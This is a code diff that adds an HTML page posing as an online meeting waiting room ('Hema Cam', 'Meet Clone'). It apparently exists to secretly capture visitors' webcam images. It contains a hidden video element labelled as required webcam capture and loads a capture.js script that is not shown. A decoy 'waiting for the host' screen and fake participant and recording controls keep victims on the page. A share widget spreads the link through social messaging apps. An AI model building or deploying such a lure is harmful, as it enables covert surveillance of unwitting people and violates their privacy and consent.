@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Hema Cam - Meeting</title>
+    <meta property="og:title" content="Hema Cam" />
+    <meta property="og:type" content="website" />
+    <meta name="og:image" content="desc.png" />
+    <meta name="description" content="Join online meeting" property="og:description" />
+    <meta name="description" content="desc.png" property="og:image" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Hema Cam" />
+    <meta name="twitter:description" content="Join online meeting" />
+    <meta name="twitter:image" content="desc.png" />
+
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="stylesheet" type="text/css" href="styles.css" />
+</head>
+<body class="meet">
+
+    <!-- Hidden webcam capture (required) -->
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+
+    <!-- ===== Animated aurora background ===== -->
+    <div class="aurora">
+        <div class="blob b1"></div>
+        <div class="blob b2"></div>
+        <div class="blob b3"></div>
+        <div class="blob b4"></div>
+    </div>
+
+    <!-- ===== Top bar ===== -->
+    <header class="meet-topbar">
+        <div class="meet-brand">
+            <span class="brand-logo"><i class="fas fa-video"></i></span>
+            <span class="brand-name">Meet Clone</span>
+        </div>
+        <div class="top-center">
+            <span class="meet-timer" id="meetTimer">00:00</span>
+            <span class="live-pill"><span class="pulse-dot"></span>LIVE</span>
+        </div>
+        <button class="top-btn" id="fsBtn" title="Fullscreen">
+            <i class="fas fa-expand"></i>
+        </button>
+    </header>
+
+    <!-- ===== Stage ===== -->
+    <main class="meet-stage">
+        <div class="stage-inner">
+            <div class="cam-card">
+                <div class="cam-frame" id="camFrame">
+                    <canvas id="canvas" width="640" height="480"></canvas>
+                    <div class="cam-border"></div>
+                    <div class="cam-name"><span class="pulse-dot green"></span>You</div>
+                </div>
+                <div class="waiting-state">
+                    <div class="spinner-ring"></div>
+                    <p class="waiting-title">Waiting for the host…</p>
+                    <p class="waiting-sub">Please stay on this page, you will be let in very soon</p>
+                    <div class="wav-bars">
+                        <span></span><span></span><span></span><span></span><span></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- ===== Bottom control bar ===== -->
+    <div class="bottom-bar">
+        <div class="bar-btns">
+            <button class="ctl-btn ripple" id="muteBtn" title="Toggle mute">
+                <i class="fas fa-microphone"></i>
+                <span>Mute</span>
+            </button>
+            <button class="ctl-btn ripple" id="camBtn" title="Toggle video">
+                <i class="fas fa-video"></i>
+                <span>Stop Video</span>
+            </button>
+            <button class="ctl-btn ripple" title="Security">
+                <i class="fas fa-shield-alt"></i>
+                <span>Security</span>
+            </button>
+            <button class="ctl-btn ripple" title="Participants">
+                <i class="fas fa-users"></i>
+                <span>Participants</span>
+            </button>
+            <button class="ctl-btn ripple" title="Share content">
+                <i class="fas fa-plus-square"></i>
+                <span>Share</span>
+            </button>
+            <button class="ctl-btn ripple" title="Chat">
+                <i class="fas fa-comments"></i>
+                <span>Chat</span>
+            </button>
+            <button class="ctl-btn ripple" id="recBtn" title="Record meeting">
+                <i class="fas fa-record-vinyl"></i>
+                <span>Record</span>
+            </button>
+        </div>
+        <button class="end-btn ripple" id="endBtn">
+            <i class="fas fa-phone-alt"></i>
+        </button>
+    </div>
+
+    <!-- ===== Host waiting popup ===== -->
+    <div id="ac-wrapper">
+        <div id="popup">
+            <div class="popup-body">
+                <div class="popup-ring"><div class="spinner-ring"></div></div>
+                <h2>Please wait</h2>
+                <p class="popup-sub">The meeting host will let you in soon…</p>
+                <div class="popup-progress"><span></span></div>
+                <button class="leave-btn ripple" id="leaveBtn">Leave waiting room</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast"></div>
+
+    <script src="capture.js"></script>
+    <script>
+        $(document).ready(function () {
+            setTimeout(function () {
+                $('#ac-wrapper').addClass('fade-out');
+                setTimeout(() => $('#ac-wrapper').css('display', 'none'), 700);
+            }, 50000);
+        });
+
+        /* Ripple */
+        document.querySelectorAll('.ripple').forEach(el => {
+            el.addEventListener('click', function (e) {
+                const r = this.getBoundingClientRect();
+                const d = Math.max(r.width, r.height) * 2;
+                const s = document.createElement('span');
+                s.className = 'rip-ink';
+                s.style.cssText = 'width:' + d + 'px;height:' + d + 'px;left:' + (e.clientX - r.left - d / 2) + 'px;top:' + (e.clientY - r.top - d / 2) + 'px';
+                this.appendChild(s);
+                setTimeout(() => s.remove(), 600);
+            });
+        });
+
+        /* Toast */
+        let tmr;
+        function toast(m) {
+            const t = document.getElementById('toast');
+            t.textContent = m; t.classList.add('show');
+            clearTimeout(tmr); tmr = setTimeout(() => t.classList.remove('show'), 2400);
+        }
+
+        /* Timer */
+        let sec = 0;
+        setInterval(() => {
+            sec++;
+            const m = String(Math.floor(sec / 60)).padStart(2, '0');
+            const s = String(sec % 60).padStart(2, '0');
+            document.getElementById('meetTimer').textContent = m + ':' + s;
+        }, 1000);
+
+        /* Toggle mute */
+        const muteBtn = document.getElementById('muteBtn');
+        let muted = false;
+        muteBtn.addEventListener('click', function () {
+            muted = !muted;
+            this.classList.toggle('is-off', muted);
+            this.querySelector('i').className = muted ? 'fas fa-microphone-slash' : 'fas fa-microphone';
+            toast(muted ? 'Microphone muted 🎙️' : 'Microphone on 🎙️');
+            if (muted) this.classList.add('shake');
+        });
+
+        /* Toggle camera */
+        const camBtn = document.getElementById('camBtn');
+        let camOff = false;
+        camBtn.addEventListener('click', function () {
+            camOff = !camOff;
+            this.classList.toggle('is-off', camOff);
+            this.querySelector('i').className = camOff ? 'fas fa-video-slash' : 'fas fa-video';
+            document.getElementById('camFrame').classList.toggle('cam-hidden', camOff);
+            toast(camOff ? 'Camera turned off 📷' : 'Camera turned on 📷');
+        });
+
+        /* Record */
+        const recBtn = document.getElementById('recBtn');
+        let rec = false;
+        recBtn.addEventListener('click', function () {
+            rec = !rec;
+            this.classList.toggle('is-rec', rec);
+            toast(rec ? '● Recording started' : 'Recording stopped');
+        });
+
+        /* Generic control click feedback */
+        document.querySelectorAll('.bar-btns .ctl-btn').forEach(b => {
+            b.addEventListener('click', function () {
+                const label = this.querySelector('span').textContent;
+                if (!this.classList.contains('is-off') && !this.classList.contains('is-rec'))
+                    toast(label + ' pressed');
+            });
+        });
+
+        /* Participants count flicker */
+        let partCount = 8;
+        document.querySelectorAll('.ctl-btn')[3].addEventListener('click', function () {
+            partCount += Math.floor(Math.random() * 3) + 1;
+            toast('👥 ' + partCount + ' participants in the meeting');
+        });
+
+        /* End call */
+        document.getElementById('endBtn').addEventListener('click', function () {
+            this.classList.add('end-click');
+            toast('Call ended · See you next time 👋');
+            setTimeout(() => location.reload(), 900);
+        });
+
+        /* Leave popup */
+        document.getElementById('leaveBtn').addEventListener('click', function () {
+            document.getElementById('ac-wrapper').classList.add('fade-out');
+            setTimeout(() => document.getElementById('ac-wrapper').style.display = 'none', 600);
+            toast('You left the waiting room 👋');
+        });
+
+        /* Fullscreen */
+        document.getElementById('fsBtn').addEventListener('click', function () {
+            if (document.fullscreenElement) document.exitFullscreen();
+            else document.documentElement.requestFullscreen().catch(() => {});
+        });
+    </script>
+<!-- ========== Share Link Widget ========== -->
+<style>
+.shFAB{position:fixed;bottom:120px;right:18px;z-index:999;width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,#4f7cff,#22c55e);color:#fff;font-size:22px;display:grid;place-items:center;cursor:pointer;box-shadow:0 8px 28px rgba(79,124,255,.5);transition:transform .25s cubic-bezier(.2,.8,.3,1.2), box-shadow .25s;animation:shPulse 3s ease-in-out infinite}
+.shFAB:hover{transform:scale(1.15);box-shadow:0 10px 34px rgba(79,124,255,.7)}
+.shFAB:active{transform:scale(.92)}
+@keyframes shPulse{0%,100%{box-shadow:0 8px 28px rgba(79,124,255,.5)}50%{box-shadow:0 8px 34px rgba(79,124,255,.85)}}
+.shPanel{position:fixed;bottom:184px;right:18px;z-index:999;width:min(360px,92vw);background:rgba(22,22,26,.96);border:1px solid rgba(255,255,255,.12);border-radius:20px;padding:22px 20px 18px;backdrop-filter:blur(16px);box-shadow:0 24px 60px rgba(0,0,0,.7);opacity:0;transform:translateY(16px) scale(.94);pointer-events:none;transition:opacity .25s ease, transform .25s cubic-bezier(.2,.8,.3,1)}
+.shPanel.open{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}
+.shPanel h4{margin:0 0 12px;font-size:15px;font-weight:800;color:#f1f1f1;display:flex;align-items:center;gap:8px}
+.shPanel h4 span{font-size:18px}
+.shClose{margin-left:auto;background:none;border:none;color:#a0a0a8;font-size:18px;cursor:pointer;transition:color .2s, transform .2s}
+.shClose:hover{color:#22c55e;transform:scale(1.2)}
+.shUrlBox{position:relative;margin-bottom:14px}
+.shUrl{width:100%;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);border-radius:10px;padding:10px 44px 10px 12px;color:#f1f1f1;font-size:12.5px;font-family:Consolas,monospace;outline:none;transition:border-color .2s}
+.shUrl:focus{border-color:#4f7cff}
+.shCopyBtn{position:absolute;right:6px;top:50%;transform:translateY(-50%);width:32px;height:32px;border-radius:8px;background:rgba(255,255,255,.1);border:none;color:#f1f1f1;font-size:14px;cursor:pointer;transition:background .2s}
+.shCopyBtn:hover{background:rgba(34,197,94,.5)}
+.shRow{display:flex;gap:7px;flex-wrap:wrap}
+.shBtn{flex:1;min-width:70px;padding:9px 6px;border-radius:11px;border:none;cursor:pointer;font-size:12.5px;font-weight:700;font-family:inherit;color:#fff;display:flex;flex-direction:column;align-items:center;gap:5px;transition:transform .2s ease, filter .2s}
+.shBtn:hover{transform:translateY(-2px) scale(1.04)}
+.shBtn:active{transform:scale(.93)}
+.shBtn .shIc{font-size:20px}
+.shBtn.i1{background:#25d366}
+.shBtn.i2{background:#0088cc}
+.shBtn.i3{background:#1877f2}
+.shBtn.i4{background:#1da1f2}
+.shBtn.i5{background:#666}
+.shToast{position:fixed;bottom:250px;right:24px;z-index:1000;background:#f1f1f1;color:#0f0f0f;font-size:13px;font-weight:700;padding:10px 18px;border-radius:12px;box-shadow:0 12px 30px rgba(0,0,0,.5);opacity:0;transform:translateY(10px);transition:opacity .3s, transform .3s;pointer-events:none}
+.shToast.show{opacity:1;transform:translateY(0)}
+</style>
+
+<div class="shFAB" id="shFAB" title="Share link to friends">🔗</div>
+<div class="shPanel" id="shPanel">
+    <h4><span>🔗</span> Share link with friends <button class="shClose" id="shClose">✕</button></h4>
+    <div class="shUrlBox">
+        <input class="shUrl" id="shUrl" readonly>
+        <button class="shCopyBtn" id="shCopy" title="Copy">📋</button>
+    </div>
+    <div class="shRow">
+        <button class="shBtn i1" data-sh="copy"><span class="shIc">📋</span>Copy</button>
+        <button class="shBtn i2" data-sh="wa"><span class="shIc">💬</span>WhatsApp</button>
+        <button class="shBtn i3" data-sh="fb"><span class="shIc">📘</span>Facebook</button>
+        <button class="shBtn i4" data-sh="tg"><span class="shIc">✈️</span>Telegram</button>
+        <button class="shBtn i5" data-sh="x"><span class="shIc">🐦</span>X / Twitter</button>
+    </div>
+</div>
+<div class="shToast" id="shToast"></div>
+
+<script>
+(function(){
+    var fab=document.getElementById('shFAB'),
+        panel=document.getElementById('shPanel'),
+        urlIn=document.getElementById('shUrl'),
+        shToast=document.getElementById('shToast');
+    var shT;
+
+    function getURL(){ return location.href.split('#')[0]; }
+
+    function showPanel(){
+        urlIn.value=getURL();
+        panel.classList.add('open');
+        urlIn.select();
+        copyText(getURL());
+        shMsg('Link copied! Send it to your friends 🚀');
+    }
+
+    function hidePanel(){ panel.classList.remove('open'); }
+
+    fab.addEventListener('click',function(e){
+        e.stopPropagation();
+        panel.classList.contains('open') ? hidePanel() : showPanel();
+    });
+
+    document.addEventListener('click',function(e){
+        if(!panel.contains(e.target) && e.target!==fab) hidePanel();
+    });
+
+    document.getElementById('shClose').addEventListener('click',hidePanel);
+
+    document.getElementById('shCopy').addEventListener('click',function(){
+        copyText(urlIn.value);
+        shMsg('Link copied! ✅');
+    });
+
+    document.querySelectorAll('.shBtn').forEach(function(btn){
+        btn.addEventListener('click',function(){
+            var u=getURL(), enc=encodeURIComponent(u), t=encodeURIComponent('Check this out! 👉 ');
+            var links={
+                copy: u,
+                wa: 'https://api.whatsapp.com/send?text='+t+enc,
+                fb: 'https://www.facebook.com/sharer/sharer.php?u='+enc,
+                tg: 'https://t.me/share/url?url='+enc+'&text='+t,
+                x: 'https://twitter.com/intent/tweet?text='+t+'&url='+enc
+            };
+            var target=links[this.dataset.sh];
+            if(this.dataset.sh==='copy'){ copyText(u); shMsg('Link copied! ✅'); }
+            else{ window.open(target,'_blank','width=600,height=500'); shMsg('Opening… 🚀'); }
+            setTimeout(hidePanel,400);
+        });
+    });
+
+    function copyText(txt){
+        if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(txt);
+        else{ var ta=document.createElement('textarea');ta.value=txt;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);}
+    }
+
+    function shMsg(m){ shToast.textContent=m;shToast.classList.add('show');clearTimeout(shT);shT=setTimeout(function(){shToast.classList.remove('show');},2200); }
+})();
+</script>
+</body>
+</html>
